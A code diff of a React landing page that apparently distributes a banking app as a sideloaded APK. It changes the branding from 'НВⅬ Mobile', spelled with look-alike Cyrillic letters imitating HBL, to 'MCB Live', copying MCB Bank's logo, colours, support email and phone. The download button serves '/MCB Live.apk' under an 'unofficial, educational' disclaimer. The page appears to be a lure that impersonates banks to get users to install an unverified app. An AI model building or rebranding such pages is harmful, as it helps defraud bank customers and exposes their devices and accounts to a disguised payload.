@@ -26,10 +26,10 @@ function App() {
     const link = document.createElement('a');
     
     // Set the href to the APK file
-    link.href = '/HBL Mobile 12.apk';
+    link.href = '/MCB Live.apk';
     
     // Set the download attribute
-    link.download = 'HBL Mobile 12.apk';
+    link.download = 'MCB Live.apk';
     
     // Set the target to blank to prevent navigation
     link.target = '_blank';
@@ -49,20 +49,26 @@ function App() {
     }, 2000);
   };
 
-  const s1 = "/images/screenshot1.webp";
-  const s2 = "/images/screenshot2.webp";
-  const s3 = "/images/screenshot3.webp";
-  const s4 = "/images/screenshot4.webp";
-  const s5 = "/images/screenshot5.webp";
+  const mcbScreenshots = [
+    { src: "/images/mcb_ss_1.png", alt: "MCB Live Screenshot 1" },
+    { src: "/images/mcb_ss_2.png", alt: "MCB Live Screenshot 2" },
+    { src: "/images/mcb_ss_3.png", alt: "MCB Live Screenshot 3" },
+    { src: "/images/mcb_ss_4.png", alt: "MCB Live Screenshot 4" },
+    { src: "/images/mcb_ss_5.png", alt: "MCB Live Screenshot 5" },
+    { src: "/images/mcb_ss_6.png", alt: "MCB Live Screenshot 6" },
+    { src: "/images/mcb_ss_7.png", alt: "MCB Live Screenshot 7" },
+    { src: "/images/mcb_ss_8.png", alt: "MCB Live Screenshot 8" },
+    { src: "/images/mcb_ss_9.png", alt: "MCB Live Screenshot 9" },
+  ];
 
   return (
     <>
       {loading ? (
         <div className="fixed inset-0 bg-white flex flex-col items-center justify-center z-50">
           <div className="w-24 h-24 mb-4">
-            <img src="/nvll-logo.png" alt="НВⅬ Logo" className="w-full h-full object-contain" />
+            <img src="/images/mcb_logo.png" alt="MCB Bank Logo" className="w-full h-full object-contain" />
           </div>
-          <h1 className="text-2xl font-bold text-green-700 mb-2">НВⅬ Mobile</h1>
+          <h1 className="text-2xl font-bold text-[#006840] mb-2">MCB Live</h1>
           <span className="text-xs text-gray-500 mb-6">v-1.0</span>
           <div className="w-16 h-16 border-t-4 border-green-700 border-solid rounded-full animate-spin"></div>
           <p className="mt-4 text-gray-600">Loading experience...</p>
@@ -81,7 +87,7 @@ function App() {
               </div>
               <div className="ml-3">
                 <p className="text-sm text-blue-50">
-                  This is an unofficial distribution page for the НВⅬ Mobile app. This app is intended for educational and demonstration purposes only.
+                  This is an unofficial distribution page for the MCB Live app. This app is intended for educational and demonstration purposes only.
                 </p>
 
                   
@@ -101,24 +107,24 @@ function App() {
           <header className="bg-white shadow-md sticky top-0 z-40">
             <div className="container mx-auto px-4 py-3 flex justify-between items-center">
               <div className="flex items-center">
-                <img src="/nvll-logo.png" alt="НВⅬ Logo" className="w-10 h-10 object-contain" />
-                <span className="text-xl font-semibold ml-2 text-green-700">НВⅬ Mobile</span>
+                <img src="/images/mcb_logo.png" alt="MCB Bank Logo" className="w-10 h-10 object-contain" />
+                <span className="text-xl font-semibold ml-2 text-[#006840]">MCB Live</span>
               </div>
               <button 
                 className="p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 lg:hidden"
                 onClick={() => setIsMenuOpen(!isMenuOpen)}
                 aria-label="Toggle menu"
               >
-                {isMenuOpen ? <FaTimes className="text-green-700 text-xl" /> : <FaBars className="text-green-700 text-xl" />}
+                {isMenuOpen ? <FaTimes className="text-[#006840] text-xl" /> : <FaBars className="text-[#006840] text-xl" />}
               </button>
               
               {/* Desktop Navigation */}
               <nav className="hidden lg:flex items-center space-x-6">
-                <a href="#features" className="text-gray-700 hover:text-green-700 transition-colors duration-200">Features</a>
-                <a href="#screenshots" className="text-gray-700 hover:text-green-700 transition-colors duration-200">Screenshots</a>
-                <a href="#download" className="text-gray-700 hover:text-green-700 transition-colors duration-200">Download</a>
+                <a href="#features" className="text-gray-700 hover:text-[#006840] transition-colors duration-200">Features</a>
+                <a href="#screenshots" className="text-gray-700 hover:text-[#006840] transition-colors duration-200">Screenshots</a>
+                <a href="#download" className="text-gray-700 hover:text-[#006840] transition-colors duration-200">Download</a>
                 <button 
-                  className="bg-green-700 hover:bg-green-800 text-white font-medium py-2 px-4 rounded-md transition-colors duration-200 flex items-center"
+                  className="bg-[#006840] hover:bg-[#005030] text-white font-medium py-2 px-4 rounded-md transition-colors duration-200 flex items-center"
                   onClick={() => setIsContactOpen(true)}
                 >
                   Contact
@@ -132,27 +138,27 @@ function App() {
                 <nav className="flex flex-col space-y-3">
                   <a 
                     href="#features" 
-                    className="py-2 px-3 text-gray-700 hover:bg-green-50 hover:text-green-700 rounded-md transition-colors duration-200"
+                    className="py-2 px-3 text-gray-700 hover:bg-green-50 hover:text-[#006840] rounded-md transition-colors duration-200"
                     onClick={() => setIsMenuOpen(false)}
                   >
                     Features
                   </a>
                   <a 
                     href="#screenshots" 
-                    className="py-2 px-3 text-gray-700 hover:bg-green-50 hover:text-green-700 rounded-md transition-colors duration-200"
+                    className="py-2 px-3 text-gray-700 hover:bg-green-50 hover:text-[#006840] rounded-md transition-colors duration-200"
                     onClick={() => setIsMenuOpen(false)}
                   >
                     Screenshots
                   </a>
                   <a 
                     href="#download" 
-                    className="py-2 px-3 text-gray-700 hover:bg-green-50 hover:text-green-700 rounded-md transition-colors duration-200"
+                    className="py-2 px-3 text-gray-700 hover:bg-green-50 hover:text-[#006840] rounded-md transition-colors duration-200"
                     onClick={() => setIsMenuOpen(false)}
                   >
                     Download
                   </a>
                   <button 
-                    className="py-2 px-3 text-left bg-green-700 hover:bg-green-800 text-white font-medium rounded-md transition-colors duration-200"
+                    className="py-2 px-3 text-left bg-[#006840] hover:bg-[#005030] text-white font-medium rounded-md transition-colors duration-200"
                     onClick={() => {
                       setIsContactOpen(true);
                       setIsMenuOpen(false);
@@ -170,21 +176,23 @@ function App() {
             <div className="container mx-auto px-4 flex flex-col md:flex-row items-center">
               <div className="text-center md:text-left md:w-1/2 mb-8 md:mb-0">
                 <h1 className="text-3xl md:text-4xl font-bold mb-4 text-green-800">
-                  НВⅬ Mobile Banking
+                  MCB Live Banking
                 </h1>
                 <p className="text-base md:text-lg text-gray-600 mb-6 max-w-lg mx-auto md:mx-0">
-                  Experience seamless banking on the go with НВⅬ Mobile - your complete banking solution in your pocket.
+                  Experience seamless banking on the go with MCB Live - your complete banking solution in your pocket.
                 </p>
-                <motion.button 
-                  className="bg-green-700 hover:bg-green-800 text-white font-bold py-2.5 px-6 rounded-lg shadow-lg flex items-center justify-center mx-auto md:mx-0 w-full md:w-auto"
-                  onClick={handleDownload}
-                  whileHover={{ scale: 1.05 }}
-                  whileTap={{ scale: 0.95 }}
-                  disabled={downloadStarted}
-                >
-                  <FaDownload className="mr-2" /> 
-                  {downloadStarted ? 'Downloading...' : 'Download App'}
-                </motion.button>
+                <div className="flex justify-center my-8">
+                  <motion.button
+                    className="bg-green-700 hover:bg-green-800 text-white font-bold py-2.5 px-6 rounded-lg shadow-lg flex items-center justify-center mx-auto max-w-md"
+                    onClick={handleDownload}
+                    whileHover={{ scale: 1.05 }}
+                    whileTap={{ scale: 0.95 }}
+                    disabled={downloadStarted}
+                  >
+                    <FaDownload className="mr-2" />
+                    {downloadStarted ? 'Downloading...' : 'Download APK'}
+                  </motion.button>
+                </div>
                 {downloadStarted && (
                   <motion.p 
                     className="text-green-600 mt-3 font-medium text-sm md:text-base"
@@ -197,8 +205,8 @@ function App() {
               </div>
               <div className="md:w-1/2 flex justify-center mt-8 md:mt-0">
                 <motion.img 
-                  src="/main-image.png" 
-                  alt="НВⅬ Mobile App Preview" 
+                  src="/images/mcb_hero.png" 
+                  alt="MCB Live App Preview" 
                   className="w-full md:w-3/4 max-h-[300px] md:max-h-96 object-contain shadow-xl rounded-xl"
                   initial={{ opacity: 0, y: 20 }}
                   animate={{ opacity: 1, y: 0 }}
@@ -213,7 +221,7 @@ function App() {
             <div className="container mx-auto px-4">
               <div className="text-center mb-8 md:mb-12">
                 <h2 className="text-2xl md:text-3xl font-bold text-green-800 mb-4">Key Features</h2>
-                <p className="text-gray-600 max-w-2xl mx-auto text-sm md:text-base">Discover the powerful features that make НВⅬ Mobile the perfect banking companion for your daily financial needs.</p>
+                <p className="text-gray-600 max-w-2xl mx-auto text-sm md:text-base">Discover the powerful features that make MCB Live the perfect banking companion for your daily financial needs.</p>
               </div>
               
               <div className="flex overflow-x-auto pb-8 space-x-6 snap-x scrollbar-hide">
@@ -222,7 +230,7 @@ function App() {
                   whileHover={{ scale: 1.05 }}
                 >
                   <div className="rounded-xl shadow-md overflow-hidden">
-                    <div className="text-green-700 text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
+                    <div className="text-[#006840] text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
                       <FaShieldAlt />
                     </div>
                     <div className="p-4 text-center">
@@ -237,7 +245,7 @@ function App() {
                   whileHover={{ scale: 1.05 }}
                 >
                   <div className="rounded-xl shadow-md overflow-hidden">
-                    <div className="text-green-700 text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
+                    <div className="text-[#006840] text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
                       <FaSync />
                     </div>
                     <div className="p-4 text-center">
@@ -252,7 +260,7 @@ function App() {
                   whileHover={{ scale: 1.05 }}
                 >
                   <div className="rounded-xl shadow-md overflow-hidden">
-                    <div className="text-green-700 text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
+                    <div className="text-[#006840] text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
                       <FaLock />
                     </div>
                     <div className="p-4 text-center">
@@ -267,7 +275,7 @@ function App() {
                   whileHover={{ scale: 1.05 }}
                 >
                   <div className="rounded-xl shadow-md overflow-hidden">
-                    <div className="text-green-700 text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
+                    <div className="text-[#006840] text-2xl md:text-3xl p-4 bg-green-50 flex items-center justify-center">
                       <FaUserFriends />
                     </div>
                     <div className="p-4 text-center">
@@ -286,75 +294,22 @@ function App() {
               <div className="text-center mb-8 md:mb-12">
                 <h2 className="text-2xl md:text-3xl font-bold text-green-800 mb-4">App Screenshots</h2>
                 <p className="text-gray-600 max-w-2xl mx-auto text-sm md:text-base">
-                  Take a look at the sleek and intuitive interface of the НВⅬ Mobile Banking app.
+                  Take a look at the sleek and intuitive interface of the MCB Live Banking app.
                 </p>
               </div>
               
               <div className="flex overflow-x-auto pb-8 space-x-6 snap-x scrollbar-hide">
-                <motion.div 
-                  className="flex-shrink-0 w-64 md:w-72 snap-center"
-                  whileHover={{ scale: 1.05 }}
-                >
-                  <div className="rounded-xl shadow-md overflow-hidden">
-                    <img src={s1} alt="Login Screen" className="w-full h-96 object-contain rounded-xl" />
-                    <div className="p-4 text-center">
-                      <h3 className="text-lg font-semibold mb-2">Login Screen</h3>
-                      <p className="text-gray-600">Secure and easy login with biometric authentication</p>
+                {mcbScreenshots.map(shot => (
+                  <motion.div
+                    key={shot.src}
+                    className="flex-shrink-0 w-64 md:w-72 snap-center"
+                    whileHover={{ scale: 1.05 }}
+                  >
+                    <div className="rounded-xl shadow-md overflow-hidden">
+                      <img alt={shot.alt} className="w-full h-96 object-contain rounded-xl" src={shot.src} />
                     </div>
-                  </div>
-                </motion.div>
-                
-                <motion.div 
-                  className="flex-shrink-0 w-64 md:w-72 snap-center"
-                  whileHover={{ scale: 1.05 }}
-                >
-                  <div className="rounded-xl shadow-md overflow-hidden">
-                    <img src={s2} alt="Dashboard" className="w-full h-96 object-contain rounded-xl" />
-                    <div className="p-4 text-center">
-                      <h3 className="text-lg font-semibold mb-2">Dashboard</h3>
-                      <p className="text-gray-600">Overview of your accounts and transactions</p>
-                    </div>
-                  </div>
-                </motion.div>
-                
-                <motion.div 
-                  className="flex-shrink-0 w-64 md:w-72 snap-center"
-                  whileHover={{ scale: 1.05 }}
-                >
-                  <div className="rounded-xl shadow-md overflow-hidden">
-                    <img src={s3} alt="Transfer Money" className="w-full h-96 object-contain rounded-xl" />
-                    <div className="p-4 text-center">
-                      <h3 className="text-lg font-semibold mb-2">Transfer Money</h3>
-                      <p className="text-gray-600">Quick and secure money transfers</p>
-                    </div>
-                  </div>
-                </motion.div>
-                
-                <motion.div 
-                  className="flex-shrink-0 w-64 md:w-72 snap-center"
-                  whileHover={{ scale: 1.05 }}
-                >
-                  <div className="rounded-xl shadow-md overflow-hidden">
-                    <img src={s4} alt="Transactions" className="w-full h-96 object-contain rounded-xl" />
-                    <div className="p-4 text-center">
-                      <h3 className="text-lg font-semibold mb-2">Transactions</h3>
-                      <p className="text-gray-600">View and manage your transaction history</p>
-                    </div>
-                  </div>
-                </motion.div>
-                
-                <motion.div 
-                  className="flex-shrink-0 w-64 md:w-72 snap-center"
-                  whileHover={{ scale: 1.05 }}
-                >
-                  <div className="rounded-xl shadow-md overflow-hidden">
-                    <img src={s5} alt="Settings" className="w-full h-96 object-contain rounded-xl" />
-                    <div className="p-4 text-center">
-                      <h3 className="text-lg font-semibold mb-2">Settings</h3>
-                      <p className="text-gray-600">Customize your app preferences</p>
-                    </div>
-                  </div>
-                </motion.div>
+                  </motion.div>
+                ))}
               </div>
             </div>
           </section>
@@ -362,7 +317,7 @@ function App() {
           {/* Download Section */}
           <section id="download" className="py-8 md:py-16 bg-gradient-to-b from-white to-gray-100">
             <div className="container mx-auto px-4 text-center">
-              <h2 className="text-2xl md:text-3xl font-bold text-green-800 mb-2">Get НВⅬ Mobile App Now</h2>
+              <h2 className="text-2xl md:text-3xl font-bold text-green-800 mb-2">Get MCB Live App Now</h2>
               <p className="text-gray-600 max-w-2xl mx-auto mb-8 text-sm md:text-base">
                 Download our app and experience the future of banking right in your hands. It's free, secure, and constantly updated with new features.
               </p>
@@ -370,30 +325,34 @@ function App() {
               <div className="bg-white rounded-xl shadow-lg p-6 max-w-3xl mx-auto">
                 <div className="flex flex-col items-center text-center">
                   <div className="space-y-4 mb-6">
-                    <h3 className="text-2xl font-semibold text-green-700">Direct Download</h3>
+                    <h3 className="text-2xl font-semibold text-[#006840]">Direct Download</h3>
                     <ul className="text-left text-gray-600 text-sm md:text-base">
                       <li className="flex items-center mb-2">
-                        <FaChevronDown className="text-green-700 mr-2" /> Latest version
+                        <FaChevronDown className="text-[#006840] mr-2" /> Latest version
                       </li>
                       <li className="flex items-center mb-2">
-                        <FaChevronDown className="text-green-700 mr-2" /> Android 5.0+
+                        <FaChevronDown className="text-[#006840] mr-2" /> Android 5.0+
                       </li>
                       <li className="flex items-center">
-                        <FaChevronDown className="text-green-700 mr-2" /> Size: 4.7MB
+                        <FaChevronDown className="text-[#006840] mr-2" /> Size: 4.7MB
                       </li>
                     </ul>
                   </div>
                   
-                  <motion.button 
-                    className="bg-green-700 hover:bg-green-800 text-white font-bold py-2.5 px-6 rounded-lg shadow-lg flex items-center justify-center w-full max-w-xs mx-auto"
-                    onClick={handleDownload}
-                    whileHover={{ scale: 1.05 }}
-                    whileTap={{ scale: 0.95 }}
-                    disabled={downloadStarted}
-                  >
-                    <FaDownload className="mr-2" /> 
-                    {downloadStarted ? 'Downloading...' : 'Download APK'}
-                  </motion.button>
+                  <div className="flex justify-center">
+                    <motion.button 
+                      className="bg-green-700 hover:bg-green-800 text-white font-bold py-2.5 px-6 rounded-lg shadow-lg flex items-center justify-center w-full max-w-xs"
+                      onClick={handleDownload}
+                      whileHover={{ scale: 1.05 }}
+                      whileTap={{ scale: 0.95 }}
+                      disabled={downloadStarted}
+                    >
+                      <FaDownload className="mr-2" /> 
+                      {downloadStarted ? 'Downloading...' : 'Download APK'}
+                    </motion.button>
+                  </div>
+
+                  
                 </div>
               </div>
             </div>
@@ -405,11 +364,11 @@ function App() {
               <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                 <div>
                   <div className="flex items-center mb-4">
-                    <img src="/nvll-logo.png" alt="НВⅬ Logo" className="w-10 h-10 object-contain" />
-                    <span className="text-xl font-semibold ml-2 text-green-400">НВⅬ Mobile</span>
+                    <img src="/images/mcb_logo.png" alt="MCB Bank Logo" className="w-10 h-10 object-contain" />
+                    <span className="text-xl font-semibold ml-2 text-green-400">MCB Live</span>
                   </div>
                   <p className="text-gray-400 mb-4 text-sm md:text-base">
-                    НВⅬ Mobile Banking app provides secure and convenient banking services on your smartphone. 
+                    MCB Live Banking app provides secure and convenient banking services on your smartphone. 
                     Access your accounts, transfer funds, pay bills, and manage your finances anytime, anywhere.
                   </p>
                   <div className="flex space-x-4">
@@ -449,11 +408,11 @@ function App() {
                   <div className="space-y-3 text-sm md:text-base">
                     <div className="flex items-start">
                       <FaEnvelope className="text-green-400 mt-1 mr-3" />
-                      <span className="font-medium">support@nvll.com</span>
+                      <span className="font-medium">support@mcb.com.pk</span>
                     </div>
                     <div className="flex items-start">
                       <FaPhone className="text-green-400 mt-1 mr-3" />
-                      <span className="font-medium">+92 21 111 111 425</span>
+                      <span className="font-medium">+92 21 111 000 622</span>
                     </div>
                     <div className="flex items-start">
                       <FaMapMarkerAlt className="text-green-400 mt-1 mr-3" />
@@ -464,7 +423,7 @@ function App() {
               </div>
               
               <div className="border-t border-gray-800 mt-10 pt-6 flex flex-col md:flex-row justify-between items-center">
-                <p className="text-gray-400 mb-4 md:mb-0 text-sm md:text-base"> {new Date().getFullYear()} НВⅬ Mobile. All rights reserved.</p>
+                <p className="text-gray-400 mb-4 md:mb-0 text-sm md:text-base"> {new Date().getFullYear()} MCB Live. All rights reserved.</p>
                 <div className="flex space-x-6">
                   <Link to="/privacy-policy" className="text-gray-400 hover:text-white transition-colors duration-200 text-sm">Privacy Policy</Link>
                   <a href="#" className="text-gray-400 hover:text-white transition-colors duration-200 text-sm">Terms of Use</a>
@@ -494,27 +453,27 @@ function App() {
                 </div>
                 
                 <p className="text-gray-600 mb-6 text-sm md:text-base">
-                  For any queries or assistance with the НВⅬ Mobile Banking App, please reach out to our customer support team:
+                  For any queries or assistance with the MCB Live Banking App, please reach out to our customer support team:
                 </p>
                 
                 <div className="bg-gray-50 rounded-lg p-4 mb-6">
                   <div className="flex items-center mb-3">
-                    <FaEnvelope className="text-green-700 mr-3" />
-                    <span className="font-medium">support@nvll.com</span>
+                    <FaEnvelope className="text-[#006840] mr-3" />
+                    <span className="font-medium">support@mcb.com.pk</span>
                   </div>
                   <div className="flex items-center mb-3">
-                    <FaPhone className="text-green-700 mr-3" />
-                    <span className="font-medium">+92 21 111 111 425</span>
+                    <FaPhone className="text-[#006840] mr-3" />
+                    <span className="font-medium">+92 21 111 000 622</span>
                   </div>
                   <div className="flex items-center">
-                    <FaMapMarkerAlt className="text-green-700 mr-3" />
+                    <FaMapMarkerAlt className="text-[#006840] mr-3" />
                     <span className="font-medium">24/7 Customer Support</span>
                   </div>
                 </div>
                 
                 <div className="flex justify-center space-x-4">
                   <motion.button 
-                    className="bg-green-700 hover:bg-green-800 text-white font-medium py-2.5 px-6 rounded-lg shadow transition-colors duration-200 flex items-center"
+                    className="bg-[#006840] hover:bg-[#005030] text-white font-medium py-2.5 px-6 rounded-lg shadow transition-colors duration-200 flex items-center"
                     onClick={handleDownload}
                     whileHover={{ scale: 1.05 }}
                     whileTap={{ scale: 0.95 }}
@@ -556,27 +515,27 @@ function App() {
             </div>
             
             <p className="text-gray-600 mb-6 text-sm md:text-base">
-              For any queries or assistance with the НВⅬ Mobile Banking App, please reach out to our customer support team:
+              For any queries or assistance with the MCB Live Banking App, please reach out to our customer support team:
             </p>
             
             <div className="bg-gray-50 rounded-lg p-4 mb-6">
               <div className="flex items-center mb-3">
-                <FaEnvelope className="text-green-700 mr-3" />
-                <span className="font-medium">support@nvll.com</span>
+                <FaEnvelope className="text-[#006840] mr-3" />
+                <span className="font-medium">support@mcb.com.pk</span>
               </div>
               <div className="flex items-center mb-3">
-                <FaPhone className="text-green-700 mr-3" />
-                <span className="font-medium">+92 21 111 111 425</span>
+                <FaPhone className="text-[#006840] mr-3" />
+                <span className="font-medium">+92 21 111 000 622</span>
               </div>
               <div className="flex items-center">
-                <FaMapMarkerAlt className="text-green-700 mr-3" />
+                <FaMapMarkerAlt className="text-[#006840] mr-3" />
                 <span className="font-medium">24/7 Customer Support</span>
               </div>
             </div>
             
             <div className="flex justify-center space-x-4">
               <motion.button 
-                className="bg-green-700 hover:bg-green-800 text-white font-medium py-2.5 px-6 rounded-lg shadow transition-colors duration-200 flex items-center"
+                className="bg-[#006840] hover:bg-[#005030] text-white font-medium py-2.5 px-6 rounded-lg shadow transition-colors duration-200 flex items-center"
                 onClick={handleDownload}
                 whileHover={{ scale: 1.05 }}
                 whileTap={{ scale: 0.95 }}
